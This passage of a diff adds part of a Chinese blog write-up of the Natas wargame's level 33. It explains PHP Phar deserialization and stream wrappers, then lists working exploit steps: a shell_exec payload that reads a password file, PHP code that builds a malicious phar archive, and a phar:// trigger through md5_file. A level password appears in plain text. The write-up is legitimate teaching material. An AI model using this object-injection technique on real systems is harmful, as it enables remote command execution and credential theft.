+            echo "Congratulations! Running firmware update: $this->filename <br>";
+            passthru("php " . $this->filename);
+        }
+        else{
+            echo "Failur! MD5sum mismatch!<br>";
+        }
+    }
+}
+?>
+```
+
+最初以为本关的考点是有关md5校验，然后后来发现`$signature`的值并不具备直接绕过的特征。在查看一些解析后发现本关是一道介绍Phar反序列化漏洞的题目。
+
+**Php ARchive 文件**
+
+`PHAR (“Php ARchive”)` 是PHP里类似于JAR的一种打包文件。可以将一个web应用，包括所有可执行的文件以及可访问的文件打包为一个文件便于分发和部署。
+
+Phar的文件结构主要包含以下四个部分：
+
++ stub存根，类似`xxx<?php xxx;__HALT_COMPILER();?>`的php代码，前面内容不限，但必须以`__HALT_COMPILER();?>`来结尾，否则phar扩展将无法识别这个文件为phar文件；
+
++ Global Phar manifest压缩文件清单；
+
+    ![33-1](/static/images/Web%E5%AE%89%E5%85%A8%E5%85%A5%E9%97%A8%E9%9D%B6%E5%9C%BANatas%E9%80%9A%E5%85%B3%E8%AF%A6%E8%A7%A3-%E4%B8%8B/33-1.png)
+
++ file contents文件内容；
++ phar文件签名(可选)；
+
+ 由上可见，Phar文件中的Meta-data会被序列化保存。正因为如此，我们可以利用其反序列化的过程，完成PHP对象注入。
+
+**PHP Wrappers**
+
+以上我们知道了Phar文件在使用时包含了序列化和反序列化的过程，然而我们如何打开Phar文件从而利用其中的反序列化漏洞呢？PHP流(PHP Streams)用于统一数据操作，比如文件数据、网络数据、压缩数据等，以使可以共享同一套函数完成。PHP的包装器可以理解为PHP数据流对于不同协议的接口。我们可以使用类似于URL的语法方案来访问一个流数据：wrapper://source。PHP提供的最常见的流接口如下所示。
+
+- file:// - Accessing local filesystem
+- http:// - Accessing HTTP(s) URLs
+- ftp:// -  Accessing FTP(s) URLs
+- php:// - Accessing various I/O streams
+- phar:// - Accessing phar files
+
+如果一个文件系统函数如`fopen()`、`filesize()`以及本题目中的`md5_file()`等以phar流为参数被调用时，则序列化的phar的元数据会自动反序列化。
+
+**Phar反序列化漏洞利用**
+
+以上我们可以看到当源码中存在以下三点必要条件，我们即可利用Phar的反序列化漏洞：
+
++ 源码中存在POP链，即可控输入的函数调用链使得可以利用敏感函数完成文件包含或者命令执行等操作；
++ 可以上传或访问到本地或者远程的恶意构造的Phar文件；
++ 源码中存在以Phar流文件作为参数的文件系统函数，作为反序列化漏洞的进入点(entry point)；
+
+针对本关，我们的攻关步骤如下所示：
+
+1. 生成pwn.php文件作为命令执行的文件，其中包含仅需包含·`<?php echo shell_exec('cat /etc/natas_webpass/natas34'); ?>`
+
+2. 构造生成phar文件的php代码，并运行生成natas33.phar文件。注意记得在`php.ini`文件中关闭`phar.readonly`选项并重启；
+
+    ```PHP
+     <?php
+         class Executor {
+             private $filename = "pwn.php";
+             private $signature = True;
+             private $init = False;
+         }
+         
+         $phar = new Phar("natas33.phar");
+         $phar->startBuffering();
+         $phar->addFromString("natas33.txt", 'pwn');
+         $phar->setStub("<?php __HALT_COMPILER(); ?>");
+         $o = new Executor();
+         $phar->setMetadata($o);
+         $phar->stopBuffering();
+     ?>
+    ```
+
+3. 上传pwn.php和natas33.phar文件到`webroot/natas33/upload`路径，注意更改请求包中的filename；
+
+4. 再次上传nata33.phar文件，但是以filename置为phar://natas33.phar(此时保存文件可以忽略), 使得在md5_file函数中以phar流文件格式请求已经上传的natas33.phar，触发反序列化漏洞，得到通关的flag。
+
+```
+natas33:shu5ouSu6eicielahhae0mohd4ui5uig
+```
+
+### Level 34: Congratulations!
+
+学无止境，继续修炼～
+
+![](/static/images/Web%E5%AE%89%E5%85%A8%E5%85%A5%E9%97%A8%E9%9D%B6%E5%9C%BANatas%E9%80%9A%E5%85%B3%E8%AF%A6%E8%A7%A3-%E4%B8%8B/34.png)
